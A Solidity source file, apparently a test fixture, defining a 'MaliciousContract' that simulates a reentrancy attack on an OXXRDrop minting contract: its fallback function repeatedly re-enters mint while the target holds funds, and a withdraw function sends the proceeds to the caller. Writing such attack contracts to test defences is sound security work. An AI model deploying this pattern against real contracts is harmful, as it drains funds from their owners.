// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./OXXRDrop.sol";

/***
 *  @title MaliciousContract
 *  @notice is used to simulate a reentrancy attack on the OXXRDrop contract.
 */
contract MaliciousContract {
    OXXRDrop public oxxrDrop;
    uint256 public drop;
    uint256 public level;
    uint256 public quantity;

    constructor(address _oxxrDropAddress) {
        oxxrDrop = OXXRDrop(_oxxrDropAddress);
    }

    // Set the attack data
    function setAttackData(uint256 _drop, uint256 _level, uint256 _quantity) public {
        drop = _drop;
        level = _level;
        quantity = _quantity;
    }

    // Main attack function
    function attack() public payable {
        // Call the mint function in the OXXRDrop contract
        oxxrDrop.mint{value: msg.value}(drop, level, quantity);
    }

    // Fallback function to be called during the reentrancy attack
    fallback() external payable {
        if (address(oxxrDrop).balance >= oxxrDrop.getPriceByLevel(drop, level)) {
            oxxrDrop.mint{value: oxxrDrop.getPriceByLevel(drop, level)}(drop, level, quantity);
        }
    }

    // Withdraw funds from the malicious contract
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}